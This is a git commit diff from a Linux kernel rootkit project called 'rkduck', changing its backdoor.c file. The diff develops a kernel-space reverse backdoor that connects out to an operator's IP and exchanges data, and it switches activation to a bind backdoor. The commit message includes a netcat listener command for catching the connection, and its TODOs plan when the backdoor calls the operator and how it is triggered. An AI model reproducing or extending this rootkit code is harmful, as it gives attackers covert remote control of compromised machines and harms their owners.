080218f3766aa19155d3ea6fbc60d3386e1f9a2f
mpgn <martial.puygrenier@gmail.com>
2016-02-15 17:49:43 +0100

    Update reverse backdoor #4
    `nc -lvp 2424`
    
    * can now send-recieve data -> oscar listen then recieve what he writes
    
    TODO:
    * thread
    * need to define when the reverse backdoor need to connect to Oscar IP
    * need to define who can the backdoor can be activate (ICMP etc)

--- rkduck/backdoor.c
+++ rkduck/backdoor.c
@@ -23,12 +23,12 @@ static void backdoor_ssh(void) {
     call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
 }
 
-static int rk_sendbuff(struct socket *sock, const char *buffer, int length)
+static int rk_sendbuff(struct socket *sock, char *buffer, int length)
 {
     struct msghdr msg;
     mm_segment_t oldfs;
     struct iovec iov;
-    int len;
+    int len = 0;
 
     iov.iov_base = (char*) buffer; 
     iov.iov_len = (__kernel_size_t) length;
@@ -39,7 +39,7 @@ static int rk_sendbuff(struct socket *sock, const char *buffer, int length)
        msg.msg_iov = &iov;
        msg.msg_iovlen = 1;
     #else
-      iov_iter_init(&msg.msg_iter, WRITE, &iov, 1, 1);
+      iov_iter_init(&msg.msg_iter, WRITE, &iov, 1, length);
     #endif
     #if LINUX_VERSION_CODE < KERNEL_VERSION(4,1,0)
         len = sock_sendmsg(sock,&msg,length);
@@ -51,31 +51,30 @@ static int rk_sendbuff(struct socket *sock, const char *buffer, int length)
 }
 
 
-static int rk_recvbuff(struct socket *sock, const char *buffer, int length)
+static int rk_recvbuff(struct socket *sock, char *buffer, int length)
 {
     struct msghdr msg;
     struct iovec iov;
-    int len;
+    int len = 0;
     mm_segment_t oldfs;
 
-    iov.iov_base = (char*) buffer;
-    iov.iov_len = (__kernel_size_t) length;
+    iov.iov_base = buffer;
+    iov.iov_len  = length;
 
     #if LINUX_VERSION_CODE < KERNEL_VERSION(3,19,0)
        msg.msg_iov = &iov;
        msg.msg_iovlen = 1;
     #else
-      iov_iter_init(&msg.msg_iter, WRITE, &iov, 1, 1);
+      iov_iter_init(&msg.msg_iter, WRITE, &iov, 1, length);
     #endif
 
-    /* Recieve the message */
-    oldfs = get_fs(); set_fs(KERNEL_DS);
-    len = sock_recvmsg(sock,&msg,length,0/*MSG_DONTWAIT*/);
+    oldfs = get_fs(); 
+    set_fs(KERNEL_DS);
+    len = sock_recvmsg(sock,&msg,length,0); //no wait
     set_fs(oldfs);
 
     if ((len!=-EAGAIN)&&(len!=0))
-        printk("Recvbuffer Recieved %i bytes \n",len);
-
+        printk("rk_recvbuff recieved %i bytes \n",len);
     return len;
 }
 
@@ -87,10 +86,13 @@ static void backdoor_reverse(void) {
     struct sockaddr_in sin;
     int error;
     char *buff = NULL;
+    char *buff2 = NULL;
+    current->flags |= PF_NOFREEZE;
 
     error = sock_create(PF_INET, SOCK_STREAM, IPPROTO_TCP, &sock);
     if (error < 0) {
         printk("Error during creation of socket; terminating\n");
+        return;
     }
 
     sin.sin_family = AF_INET;
@@ -101,20 +103,48 @@ static void backdoor_reverse(void) {
     if (error < 0) {
         printk("Error during connection of socket; terminating\n");
         sock_release(sock);
+        return;
     }
     
-    buff = kmalloc(1024, GFP_KERNEL);
+    buff = kmalloc(512, GFP_KERNEL);
+    buff2 = kmalloc(512, GFP_KERNEL);
     if (buff == NULL)
     {
         printk("No mem\n");
         sock_release(sock);
+        return;
     }
-    strcpy(buff, "Hello World\n");
 
-    rk_sendbuff(sock, buff, 1024);
+    int tt = 0;
+    while(true) {
+        if (signal_pending(current))
+            break;
+        tt = rk_recvbuff(sock, buff, 512);
+        //printk("tt length %i\n", tt);
+        if (tt > 0) {
+            int res = 0;
+            //printk("socket length %i\n", strlen(buff));
+            strncpy(buff2, buff, tt);
+            //printk("socket length %i\n", strlen(buff2));
+            res = rk_sendbuff(sock, buff2, tt);
+
+            //cleanup the buffer
+            memset(buff, '\0', sizeof(buff));
+            memset(buff2, '\0', sizeof(buff2));
+            if (res == 0) {
+                printk("Error during connection of socket; terminating\n");
+                break;
+            }
+            tt = 0;
+        } else {
+            printk("Error during connection of socket; terminating\n");
+            break;
+        }
+    }
 
     sock_release(sock);
     kfree(buff);
+    kfree(buff2);
 }
 
 static void backdoor_bind(void) {
@@ -169,9 +199,9 @@ void backdoor(void) {
     }
 
     /* TODO REVERSE BACKDOOR */
-    backdoor_reverse();
+    //backdoor_reverse();
 
     /* TODO ACTIVATOR BACKDOOR */
     // caution don't, please don't
-    //backdoor_bind();
+    backdoor_bind();
 }
